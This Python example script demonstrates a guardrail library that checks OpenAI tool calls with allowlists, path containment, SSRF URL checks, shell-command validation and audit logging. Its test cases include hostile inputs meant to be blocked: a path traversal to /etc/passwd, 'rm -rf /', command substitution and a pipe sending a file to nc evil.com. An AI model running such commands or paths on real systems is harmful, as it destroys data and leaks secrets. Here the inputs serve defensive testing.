"""
OpenAI + Tenuo Tier 1 Guardrails Example

A minimal example showing how to protect OpenAI tool calls with Tenuo guardrails.
This uses Tier 1 (no cryptography) - runtime constraint checking only.

⚠️  PRODUCTION WARNING: Tier 1 is suitable for prototyping and single-process scenarios.
    For production systems where insider threats or container compromise are concerns,
    use Tier 2 (Warrant + PoP). See examples/openai_warrant.py for cryptographic protection.

With Constraints (Builder - Recommended):
    client = (GuardBuilder(openai.OpenAI())
        .allow("search")
        .allow("read_file", path=Subpath("/data"))
        .deny("delete_file")
        .build())

Alternative (Dict Style):
    client = guard(
        openai.OpenAI(),
        allow_tools=["search", "read_file"],
        constraints={"read_file": {"path": Pattern("/data/*")}}
    )

Requirements:
    uv pip install openai tenuo
"""

import os

# Universal constraints (work with any integration)
from tenuo import Pattern, Range, Shlex, Subpath, UrlSafe

# OpenAI-specific
from tenuo.openai import (
    AuditEvent,
    ConstraintViolation,
    GuardBuilder,
    ToolDenied,
    guard,
    protect,  # Zero-config entry point
)

# Try to import OpenAI
try:
    import openai

    OPENAI_AVAILABLE = True
except ImportError:
    OPENAI_AVAILABLE = False
    print("Install OpenAI: uv pip install openai\n")


# ============================================================================
# Mock Client (for demo without API key)
# ============================================================================


class MockOpenAIClient:
    """Mock OpenAI client for demonstration purposes."""

    class chat:
        class completions:
            @staticmethod
            def create(**kwargs):
                """Simulate response - returns tool call for demo."""
                from dataclasses import dataclass

                @dataclass
                class Function:
                    name: str
                    arguments: str

                @dataclass
                class ToolCall:
                    id: str
                    function: Function

                @dataclass
                class Message:
                    role: str
                    content: str
                    tool_calls: list

                @dataclass
                class Choice:
                    message: Message

                @dataclass
                class Response:
                    choices: list

                # Simulate what a malicious/confused model might return
                messages = kwargs.get("messages", [])
                user_msg = messages[-1]["content"] if messages else ""

                # Simulate tool calls based on user input
                if "/etc/passwd" in user_msg:
                    tool_name, args = "read_file", '{"path": "/etc/passwd"}'
                elif "delete" in user_msg.lower():
                    tool_name, args = "delete_file", '{"path": "/important.txt"}'
                else:
                    tool_name, args = "read_file", '{"path": "/data/report.txt"}'

                return Response(
                    choices=[
                        Choice(
                            message=Message(
                                role="assistant",
                                content=None,
                                tool_calls=[ToolCall(id="call_1", function=Function(name=tool_name, arguments=args))],
                            )
                        )
                    ]
                )


# ============================================================================
# Demo Functions
# ============================================================================


def demo_builder_pattern():
    """Demonstrate the recommended builder pattern."""
    print("=" * 60)
    print("Demo 0: Builder Pattern (Recommended)")
    print("=" * 60)

    # Builder pattern - fluent, readable API
    client = (
        GuardBuilder(MockOpenAIClient())
        .allow("search")
        .allow("read_file", path=Subpath("/data"))
        .allow("send_email", to=Pattern("*@company.com"))
        .deny("delete_file")
        .on_denial("raise")
        .build()
    )

    print("Created guarded client with:")
    print(f"  Allowed tools: {client._allow_tools}")
    print(f"  Denied tools: {client._deny_tools}")
    print(f"  Constraints: {list(client._constraints.keys())}")

    # Test a valid call
    try:
        client.chat.completions.create(
            model="gpt-4o",
            messages=[{"role": "user", "content": "Read /data/report.txt"}],
        )
        print("  Valid call: ALLOWED")
    except Exception as e:
        print(f"  Valid call: BLOCKED - {e}")

    print()


def demo_constraint_violation():
    """Demonstrate blocking a constraint violation."""
    print("=" * 60)
    print("Demo 1: Constraint Violation (Path Protection)")
    print("=" * 60)

    # Dict style (alternative to builder)
    client = guard(
        MockOpenAIClient(),
        allow_tools=["read_file", "search"],
        constraints={
            "read_file": {
                "path": Pattern("/data/*"),  # Only /data/* paths allowed
            },
        },
        on_denial="raise",
    )

    # Try to make a call that violates constraints
    try:
        client.chat.completions.create(
            model="gpt-4o",
            messages=[{"role": "user", "content": "Read /etc/passwd"}],
        )
        print("✗ Should have been blocked!")
    except ConstraintViolation as e:
        print(f"✓ Blocked: {e}")
        print(f"  Tool: {e.tool_name}")
        print(f"  Param: {e.param}")
        print(f"  Value: {e.value}")
        print(f"  Type mismatch: {e.type_mismatch}")

    print()


def demo_tool_denied():
    """Demonstrate blocking a tool not in the allowlist."""
    print("=" * 60)
    print("Demo 2: Tool Denied (Hallucinated Tool)")
    print("=" * 60)

    # Create protected client
    client = guard(
        MockOpenAIClient(),
        allow_tools=["read_file", "search"],  # delete_file NOT in list
        deny_tools=["delete_file"],  # Explicitly blocked for defense-in-depth
        on_denial="raise",
    )

    # Try a tool that's not allowed
    try:
        client.chat.completions.create(
            model="gpt-4o",
            messages=[{"role": "user", "content": "delete the important file"}],
        )
        print("✗ Should have been blocked!")
    except ToolDenied as e:
        print(f"✓ Blocked: {e}")

    print()


def demo_url_safe_protection():
    """Demonstrate UrlSafe for SSRF protection."""
    print("=" * 60)
    print("Demo 2c: SSRF Protection (UrlSafe)")
    print("=" * 60)

    print("\nUrlSafe blocks dangerous URLs by default:")
    constraint = UrlSafe()

    test_cases = [
        ("https://api.github.com/repos", True, "Public API"),
        ("http://169.254.169.254/", False, "AWS metadata"),
        ("http://127.0.0.1/", False, "Loopback"),
        ("http://10.0.0.1/", False, "Private IP"),
        ("http://2130706433/", False, "Decimal IP (127.0.0.1)"),
    ]

    for url, expected, desc in test_cases:
        result = constraint.is_safe(url)
        status = "✓" if result == expected else "✗"
        print(f"  {status} {url:<35} -> {'SAFE' if result else 'BLOCKED'} ({desc})")

    print("\nWith domain allowlist:")
    strict = UrlSafe(allow_domains=["api.github.com", "*.googleapis.com"])
    print("  UrlSafe(allow_domains=['api.github.com', '*.googleapis.com'])")
    print(f"    api.github.com: {'SAFE' if strict.is_safe('https://api.github.com/') else 'BLOCKED'}")
    print(f"    evil.com: {'SAFE' if strict.is_safe('https://evil.com/') else 'BLOCKED'}")
    print()


def demo_subpath_protection():
    """Demonstrate Subpath for path traversal protection."""
    print("=" * 60)
    print("Demo 2b: Path Traversal Protection (Subpath)")
    print("=" * 60)

    print("\nSubpath vs Pattern:")
    print("  Pattern('/data/*') allows: /data/../etc/passwd ⚠️ UNSAFE")
    print("  Subpath('/data') BLOCKS:   /data/../etc/passwd ✓ SAFE")
    print()

    # Create protected client with Subpath
    guard(
        MockOpenAIClient(),
        allow_tools=["read_file"],
        constraints={
            "read_file": {
                # Subpath normalizes paths and prevents traversal
                "path": Subpath("/data"),
            },
        },
        on_denial="raise",
    )

    # Create a mock that returns a traversal attack
    class TraversalMock(MockOpenAIClient):
        class chat:
            class completions:
                @staticmethod
                def create(**kwargs):
                    from dataclasses import dataclass

                    @dataclass
                    class Function:
                        name: str = "read_file"
                        # Classic path traversal attack
                        arguments: str = '{"path": "/data/../etc/passwd"}'

                    @dataclass
                    class ToolCall:
                        id: str = "call_1"
                        function: Function = None

                        def __post_init__(self):
                            self.function = Function()

                    @dataclass
                    class Message:
                        role: str = "assistant"
                        content: str = None
                        tool_calls: list = None

                        def __post_init__(self):
                            self.tool_calls = [ToolCall()]

                    @dataclass
                    class Choice:
                        message: Message = None

                        def __post_init__(self):
                            self.message = Message()

                    @dataclass
                    class Response:
                        choices: list = None

                        def __post_init__(self):
                            self.choices = [Choice()]

                    return Response()

    traversal_client = guard(
        TraversalMock(),
        allow_tools=["read_file"],
        constraints={
            "read_file": {
                "path": Subpath("/data"),
            },
        },
        on_denial="raise",
    )

    # Attempt path traversal
    try:
        traversal_client.chat.completions.create(
            model="gpt-4o",
            messages=[{"role": "user", "content": "anything"}],
        )
        print("✗ Should have been blocked!")
    except ConstraintViolation as e:
        print(f"✓ Path traversal blocked: {e.tool_name}")
        print(f"  Value: {e.value}")
        print("  Normalized: /etc/passwd (escaped from /data)")
        print("  Constraint: Subpath('/data')")

    print()


def demo_shlex_protection():
    """Demonstrate Shlex for shell injection protection."""
    print("=" * 60)
    print("Demo 2d: Shell Injection Protection (Shlex)")
    print("=" * 60)

    print("\nShlex validates shell command strings:")
    constraint = Shlex(allow=["ls", "cat", "grep"])

    test_cases = [
        ("ls -la /tmp", True, "Valid: allowed binary"),
        ("cat /etc/passwd", True, "Valid: allowed binary"),
        ("ls; rm -rf /", False, "Blocked: command chaining"),
        ("cat file | nc evil.com", False, "Blocked: pipe injection"),
        ("echo $(whoami)", False, "Blocked: command substitution"),
        ("ls $HOME", False, "Blocked: variable expansion"),
        ("rm -rf /", False, "Blocked: binary not in allowlist"),
    ]

    for cmd, expected, desc in test_cases:
        result = constraint.matches(cmd)
        status = "✓" if result == expected else "✗"
        action = "SAFE" if result else "BLOCKED"
        print(f"  {status} {cmd:<25} -> {action:<8} ({desc})")

    print("\nShlex with glob blocking:")
    strict = Shlex(allow=["ls"], block_globs=True)
    print("  Shlex(allow=['ls'], block_globs=True)")
    print(f"    ls -la /tmp:   {'SAFE' if strict.matches('ls -la /tmp') else 'BLOCKED'}")
    print(f"    ls *.txt:      {'SAFE' if strict.matches('ls *.txt') else 'BLOCKED'} (globs blocked)")

    print()


def demo_valid_call():
    """Demonstrate a valid call that passes all checks."""
    print("=" * 60)
    print("Demo 3: Valid Call (Passes Guardrails)")
    print("=" * 60)

    # Create protected client
    client = guard(
        MockOpenAIClient(),
        allow_tools=["read_file", "search"],
        constraints={
            "read_file": {
                "path": Pattern("/data/*"),
            },
        },
        on_denial="raise",
    )

    # This should pass - path matches pattern
    try:
        response = client.chat.completions.create(
            model="gpt-4o",
            messages=[{"role": "user", "content": "Read the report"}],
        )
        tool_call = response.choices[0].message.tool_calls[0]
        print(f"✓ Allowed: {tool_call.function.name}")
        print(f"  Arguments: {tool_call.function.arguments}")
    except (ToolDenied, ConstraintViolation) as e:
        print(f"✗ Unexpected block: {e}")

    print()


def demo_real_openai():
    """Demonstrate with real OpenAI client (if available)."""
    print("=" * 60)
    print("Demo 6: Real OpenAI Integration")
    print("=" * 60)

    if not OPENAI_AVAILABLE:
        print("OpenAI not installed. Install with: uv pip install openai\n")
        return

    if not os.getenv("OPENAI_API_KEY"):
        print("OPENAI_API_KEY not set. Set it to use real OpenAI API.\n")
        print("Example:")
        print("  export OPENAI_API_KEY='your-key-here'\n")
        return

    # Real OpenAI integration
    guard(
        openai.OpenAI(),
        allow_tools=["read_file", "search"],
        constraints={
            "read_file": {
                "path": Pattern("/data/*"),
            },
            "search": {
                "max_results": Range(1, 50),
            },
        },
        on_denial="raise",
    )

    print("Real OpenAI client created with guardrails.")
    print("Use: real_client.chat.completions.create(...)")
    print()


def demo_audit_callback():
    """Demonstrate audit callback for compliance logging."""
    print("=" * 60)
    print("Demo 4: Audit Callback (Compliance Logging)")
    print("=" * 60)

    # Collect audit events
    audit_log = []

    def log_audit(event: AuditEvent):
        audit_log.append(event)
        print(f"  AUDIT: {event.decision} {event.tool_name}")
        print(f"         session={event.session_id}, hash={event.constraint_hash}")

    client = guard(
        MockOpenAIClient(),
        allow_tools=["read_file"],
        constraints={"read_file": {"path": Pattern("/data/*")}},
        audit_callback=log_audit,  # Every decision is logged
    )

    print(f"\n  Session ID: {client.session_id}")
    print(f"  Constraint hash: {client.constraint_hash}")
    print()

    # Make a valid call
    try:
        client.chat.completions.create(
            model="gpt-4o",
            messages=[{"role": "user", "content": "Read the report"}],
        )
    except Exception:
        pass

    print(f"\n  Events logged: {len(audit_log)}")
    print()


def demo_skip_mode():
    """Demonstrate skip mode (silent filtering)."""
    print("=" * 60)
    print("Demo 5: Skip Mode (Silent Filtering)")
    print("=" * 60)

    client = guard(
        MockOpenAIClient(),
        allow_tools=["read_file", "search"],
        constraints={
            "read_file": {
                "path": Pattern("/data/*"),
            },
        },
        on_denial="skip",  # Don't raise, just filter out
    )

    # This won't raise - the denied tool call is silently removed
    response = client.chat.completions.create(
        model="gpt-4o",
        messages=[{"role": "user", "content": "Read /etc/passwd"}],
    )

    tool_calls = response.choices[0].message.tool_calls
    if tool_calls is None:
        print("✓ Tool call was silently filtered out (skip mode)")
    else:
        print(f"Tool calls remaining: {len(tool_calls)}")

    print("\n⚠ Warning: Using skip mode can cause the LLM to hang")
    print("  if it expects a tool response that never comes.")
    print("  Prefer on_denial='raise' and handle the exception.\n")


def demo_zero_config():
    """Quickest start - zero configuration protection."""
    print("=== Zero Config (protect) ===")

    # This is the simplest way to add Tenuo protection
    mock_client = MockOpenAIClient()
    client = protect(mock_client, tools=["search", "read_file"])

    print("Created client with protect():")
    print(f"  - Client type: {type(client).__name__}")
    print("  - Only 'search' and 'read_file' are allowed")
    print("  - All other tools are blocked automatically")
    print("  - No constraints needed for basic protection\n")


def main():
    print("\n=== OpenAI + Tenuo Tier 1 Guardrails ===\n")
    print("This example shows Tier 1 (no cryptography) protection:")
    print("  - Builder pattern with semantic constraints (recommended)")
    print("  - Subpath for secure path containment (blocks traversal)")
    print("  - UrlSafe for SSRF protection (blocks private IPs, metadata)")
    print("  - Simple allowlist: protect(client, tools=[...])")
    print("  - Type-strict validation\n")

    demo_builder_pattern()  # Recommended - shows Tenuo's value
    demo_zero_config()  # Simple alternative
    demo_constraint_violation()
    demo_tool_denied()
    demo_subpath_protection()
    demo_url_safe_protection()
    demo_shlex_protection()
    demo_valid_call()
    demo_audit_callback()
    demo_skip_mode()
    demo_real_openai()

    print("=" * 60)
    print("For Tier 2 (cryptographic warrants with PoP), see:")
    print("  - tenuo-python/examples/openai_warrant.py")
    print("=" * 60)


if __name__ == "__main__":
    main()
